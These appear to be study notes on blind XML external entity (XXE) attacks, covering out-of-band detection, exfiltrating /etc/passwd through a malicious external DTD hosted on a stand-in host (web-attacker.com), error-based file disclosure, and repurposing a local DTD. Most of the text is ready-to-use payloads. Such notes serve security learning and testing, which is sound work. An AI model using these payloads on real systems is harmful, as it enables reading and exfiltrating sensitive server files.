# Detecting blind [[XXE]] using out-of-band (OAST) techniques

Use HTTP request:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://bupr-collaborator.web-attacker.com"> ]>
```
Monitor if there any DNS or HTTP requests to your URL.

If entities are blocked, due to input validation, you might be able to use XML parameter entities instead which can be referenced within DTO only.
**Declaration example**:
```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```
**Usage**:
```
%myparameterentity;
```
**Example**:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

# Exploiting blind XXE to exfiltrate data out-of-band
Malicous external DTD:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Host it on attacker machine:
`http://web-attacker.com/malicious.dtd`
XXE payload:
```dtd
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
Insert it between `<xml />` definition and first xml tag. No need to use entity inside xml, just DTD.

Data contained newlines won't work because of URL validation, but it's still possible to use `/etc/hostname` or FTP can be used instead of HTTP.

## Exploiting blind XXE to retrieve data via error messages
Malicious external DTD:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval;
%error;
```
Host it on attacker machine:
`http://web-attacker.com/malicious.dtd`
XXE payload:
```dtd
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
Insert it between `<xml />` definition and first xml tag. No need to use entity inside xml, just DTD.

## Exploiting blind XXE by repurposing a local DTD
out-of-band interactions are blocked
you can't load an external DTD from a remote server. 

Error-based from within an internal DTDa, provided the XML parameter entity that they use is redefining an entity that is declared within an external DTD. 

The attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data. 
#### Example
Assume we have `/usr/local/app/schema.dtd` on the system.
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

#### Locating an existing DTD file to repurpose
For example, Linux systems using the GNOME desktop environment often have a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`
Test if file xists:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
#### TLDR
1. Import local DTD
2. Redefine entity
3. Trigger an error message